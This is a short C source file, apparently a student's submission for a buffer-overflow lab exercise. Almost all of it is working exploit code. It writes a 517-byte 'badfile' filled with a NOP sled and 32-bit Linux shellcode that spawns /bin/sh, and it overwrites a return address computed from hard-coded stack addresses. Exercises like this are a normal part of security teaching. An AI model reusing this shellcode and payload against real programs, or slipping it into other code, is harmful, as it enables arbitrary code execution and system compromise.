//t0930060 Lab05 Buffer flow
/*exploit.c*/
#include <stdio.h>
#include <string.h>

const char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80";

// Fill the content with NOP's
#define SIZE 517
char content[SIZE];

int main() {
    memset(content, 0x90, SIZE);

    // Put the shellcode somewhere in the payload
    int start = SIZE - sizeof(shellcode);
    memcpy(content + start, shellcode, sizeof(shellcode));

    // Decide the return address value
    // and put it somewhere in the payload
    unsigned int ret = 0xffffcadc+start; // Change this number
    int offset = 0xffffcb48-0xffffcadc+4;       // Change this number

    int L = 4; // Use 4 for 32-bit address and 8 for 64-bit address
    memcpy(content + offset, &ret, L);

    // Write the content to a file
    FILE *f = fopen("badfile", "wb");
    if (f != NULL) {
        fwrite(content, sizeof(char), SIZE, f);
        fclose(f);
        printf("File 'badfile' created successfully.\n");
    } else {
        printf("Error creating file 'badfile'.\n");
        return 1;
    }

    return 0;
}
